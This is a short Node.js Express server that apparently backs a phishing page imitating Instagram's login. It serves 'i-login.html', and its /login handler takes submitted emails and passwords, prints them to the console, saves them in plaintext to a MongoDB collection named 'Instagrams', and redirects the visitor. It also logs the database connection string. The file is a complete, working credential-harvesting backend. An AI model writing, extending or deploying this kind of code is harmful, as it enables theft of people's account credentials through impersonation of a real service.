const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const dotenv = require('dotenv');

dotenv.config({ path: './encrypt/config.env' });
const mongoose = require('mongoose');


app.use(express.static('Public'));
app.use(bodyParser.urlencoded({ extended: true }));
const DB = process.env.DATABASE;

console.log(DB)

mongoose.connect(DB, { useNewUrlParser: true }).then(() => {
    console.log('connected to the database')
}).catch((err) => {
    console.log(err);
})

mongoose.set('strictQuery', true);


const userSchema = new mongoose.Schema({
    email: String,
    password: String
});

const User = mongoose.model('Instagrams', userSchema);


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/Public/i-login.html');
})

var Email;
var Password;

app.post('/login', (req, res) => {
    Email = req.body.email;
    Password = req.body.password;

    console.log(Email, Password);
    const user = new User({
        email: Email,
        password: Password
    })

    user.save();
    res.redirect('/login');
})




app.listen(process.env.Port || 3000, (err, result) => {
    console.log('running the server....')
})
